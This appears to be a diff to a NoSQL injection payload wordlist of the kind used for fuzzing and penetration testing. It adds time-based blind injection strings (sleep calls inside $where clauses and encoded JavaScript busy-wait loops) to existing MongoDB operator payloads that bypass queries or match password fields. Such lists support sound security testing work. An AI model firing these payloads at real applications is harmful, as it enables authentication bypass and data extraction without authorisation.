@@ -6,6 +6,7 @@ $gt
 $ne
 $nin
 $where: '1 == 1'
+$where=sleep(100)
 '
 ' && this.password.match(/.*/)//+%00
 ' && this.passwordzz.match(/.*/)//+%00
@@ -19,7 +20,10 @@ $where: '1 == 1'
 '"\;{}
 '%20%26%26%20this.password.match(/.*/)//+%00
 '%20%26%26%20this.passwordzz.match(/.*/)//+%00
+'%2b(function()%7bif(typeof%20dipyx%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bdipyx%3d1%3b%7d%7d())%2b'
+'%2bfunction(){var waitTill = new Date(new Date().getTime() %2b 5000);while(waitTill > new Date()){};}(this)%2b'
 ''
+'+function(){var waitTill = new Date(new Date().getTime() + 5000);while(waitTill > new Date()){};}(this)+'
 ', $or: [ {}, { 'a':'a
 ', $where: '1 == 1
 ', $where: '1 == 1'
@@ -38,6 +42,7 @@ $where: '1 == 1'
 1, $where: '1 == 1'
 ;
 ;%00
+;sleep(100);
 OR 1=1
 [$ne]=1
 db.injection.insert({success:1});
@@ -52,6 +57,7 @@ true, $where: '1 == 1'
 {"$ne":-1}
 {"$nin":1}
 {"$nin":[1]}
+{"$where":  "sleep(100)"}
 {"$where":  "sleep(1000)"}
 {$gt: ''}
 || '1'=='1
